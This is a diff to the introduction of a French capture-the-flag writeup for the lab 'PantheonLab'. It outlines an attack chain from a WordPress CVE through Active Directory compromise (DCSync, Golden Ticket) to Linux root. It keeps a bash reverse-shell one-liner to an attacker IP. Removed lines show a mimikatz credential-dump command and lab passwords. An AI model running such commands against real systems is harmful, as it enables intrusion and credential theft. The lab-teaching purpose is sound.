@@ -1,20 +1,38 @@
 # Introduction au Writeup
 
+!!! danger "⚠️ Avertissement - Copier n'est pas apprendre"
+    **Ce writeup est fourni à des fins éducatives uniquement !**
+    
+    🎯 **Recommandation forte** : Essayez d'abord de résoudre le lab par vous-même avant de consulter cette solution.
+    
+    📚 **Pourquoi ?** 
+    - Les **vraies compétences** se développent en cherchant, en échouant, et en recommençant
+    - Copier-coller ne vous apprendra **rien de durable**
+    - La **satisfaction** de résoudre un défi par soi-même est incomparable
+    - En cybersécurité, **l'adaptabilité** est plus importante que la mémorisation
+    
+    🏆 **Rappelez-vous** : Il n'y a aucune récompense à la fin de ce lab, si ce n'est les **compétences et connaissances** que vous aurez acquises. Autant que ce soit par votre propre effort !
+    
+    💡 **Utilisez ce writeup comme** :
+    - Une **validation** de votre approche après avoir trouvé
+    - Une **aide** quand vous êtes vraiment bloqué (eviter cette page car elle résumer beaucoup de choses simultanément.)
+    - Une **source d'apprentissage** pour comprendre les techniques
+
 ## 🎯 Objectif du Lab
 
-Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur.
+Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur sur toutes les machines.
 
 ## 🏛️ Contexte du Scénario
 
-Dans l'univers de PantheonLab, les dieux de l'Olympe ont modernisé leur royaume en adoptant les technologies numériques. Cependant, cette transition a introduit des vulnérabilités que nous devons identifier et exploiter pour sécuriser le Panthéon numérique.
+Dans l'univers de PantheonLab, les dieux de l'Olympe ont décidé de mettre en place des jeux afin de permettre à un mortel de se hisser au-dessus des autres et de les rejoindre au Panthéon. Cependant, un dieu, Hermès, s'agace dans l'ombre de n'être que le messager. Il a introduit des vulnérabilités pour s'approcher discrètement des dieux — des vulnérabilités que vous devrez identifier et exploiter afin de compromettre entièrement cet environnement.
 
 ### Machines Cibles
 
-| Machine | IP | Rôle | Point d'Entrée |
-|---------|----|------|----------------|
-| **Olympe** | 192.168.56.10 | Serveur Linux/WordPress | ✅ Principal |
-| **DC01** | 192.168.56.11 | Contrôleur de domaine | 🔒 Objectif final |
-| **Enfers** | 192.168.56.12 | Serveur membre | 🔒 Lateral movement |
+| Machine | IP | Rôle |
+|---------|----|------|
+| **Olympe** | 192.168.56.10 | Serveur Linux/WordPress |
+| **DC01** | 192.168.56.11 | Contrôleur de domaine  |
+| **Enfers** | 192.168.56.12 | Serveur membre |
 
 ## 🔍 Méthodologie d'Attaque
 
@@ -24,46 +42,57 @@ Dans l'univers de PantheonLab, les dieux de l'Olympe ont modernisé leur royaume
 - **Recherche de vulnérabilités** : Identification des vecteurs d'attaque
 
 ### Phase 2 : Exploitation Initiale
-- **Exploitation WordPress** : Bypass d'authentification
+- **Exploitation WordPress** : Exploitation de CVE
 - **Obtenir un shell** : Accès initial sur Olympe
-- **Élévation de privilèges** : Accès utilisateur hermes
+- **Élévation de privilèges** : Accès à utilisateur hermes
 
 ### Phase 3 : Lateral Movement
 - **Énumération Active Directory** : Découverte du domaine
 - **Exploitation des credentials** : Utilisation des comptes trouvés
-- **Accès aux machines Windows** : Pivot vers DC01 et Enfers
+- **Accès aux machines Windows** : Pivot vers DC01 
 
-### Phase 4 : Persistence et Privilèges
+### Phase 4 : Compromision du domaine
 - **Escalade de privilèges** : Obtenir l'accès administrateur
-- **DCSync** : Extraction des hashes du domaine
+- **Accès aux machines Windows** : Pivot vers ENFERS 
 - **Golden Ticket** : Contrôle total du domaine
+- **DCSync** : Extraction des hashes du domaine
+
+### Phase 5 : Escalade de privilège linux
+- **Password Reused** : Connexion en tant que hera sur la machine linux
+- **Exploitation** : Insecure cron jobs
+- **Escalade de privilèges** : Obtenir l'accès root
 
 ## 🛠️ Outils Utilisés
 
 ### Énumération
 ```bash
 # Réseau
-nmap -sC -sV -p- 192.168.56.10
+nmap 
+netexec||nxc
 
 # Web
-wpscan --url http://192.168.56.10 --plugins-detection aggressive
-gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt
+wpscan 
+gobuster
 
 # Active Directory
-nxc smb 192.168.56.11 -u user -p pass --shares
-bloodhound-python -d pantheon.god -u user -p pass -c All
+netexec||nxc
+rusthound
+bloodhound
 ```
 
 ### Exploitation
 ```bash
 # WordPress
-python3 CVE-2025-32118.py -u http://192.168.56.10 -un hermes -p mondieu
+CVE-2025-32118.py
 
 # Reverse Shell
 bash -c 'bash -i >& /dev/tcp/192.168.56.1/9001 0>&1'
 
 # Active Directory
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+mimikatz.exe
+rubeus.exe
+SharpSuccessor.exe
+GMSAPasswordReader.exe
 ```
 
 ## 📊 Progression Attendue
@@ -80,33 +109,16 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
 - [x] Accès au domaine Active Directory
 
 ### Niveau 3 : Lateral Movement
-- [ ] Énumération complète du domaine
-- [ ] Découverte des utilisateurs et groupes
-- [ ] Exploitation des vulnérabilités Kerberos
+- [x] Énumération complète du domaine
+- [x] Découverte des utilisateurs et groupes
+- [x] Exploitation des vulnérabilités Kerberos
 
 ### Niveau 4 : Contrôle Total
-- [ ] Escalade vers administrateur
-- [ ] DCSync du domaine
-- [ ] Création de Golden Ticket
+- [x] Escalade vers administrateur
+- [x] Création de Golden Ticket
+- [x] DCSync du domaine
+- [x] Privesc Linux
 
-## 🎭 Thématique Mythologique
-
-Chaque étape du writeup correspond à une rencontre avec les dieux de l'Olympe :
-
-### Hermès - Le Messager
-- **Vulnérabilité** : Credentials faibles (hermes:y)
-- **Scénario** : Intercepter les messages divins
-- **Technique** : Brute force, exploitation WordPress
-
-### Zeus - Le Roi des Dieux
-- **Vulnérabilité** : Contrôleur de domaine
-- **Scénario** : Détrôner le roi de l'Olympe
-- **Technique** : DCSync, Golden Ticket
-
-### Héra - La Reine Jalouse
-- **Vulnérabilité** : Politiques de sécurité
-- **Scénario** : Contourner la surveillance divine
-- **Technique** : Bypass des politiques, audit evasion
 
 ## ⚠️ Avertissements Importants
 
@@ -139,12 +151,11 @@ Chaque étape du writeup correspond à une rencontre avec les dieux de l'Olympe 
 - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
 - [HackTricks Active Directory](https://book.hacktricks.xyz/pentesting/pentesting-active-directory)
 - [BloodHound Documentation](https://bloodhound.readthedocs.io/)
+- [The Hacker Recipes](https://www.thehacker.recipes/)
+- [The Hacker Recipes](https://www.thehacker.recipes/)
+- [akamai/Badsuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
 
-### Outils et Scripts
-- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
-- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
-- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 
 ---
 
-*Prêt à commencer votre quête dans l'Olympe numérique ? Que la sagesse d'Athéna vous guide dans cette aventure épique !* ⚡🏛️ 
+*Que la sagesse d'Athéna vous guide  !* ⚡🏛️ 
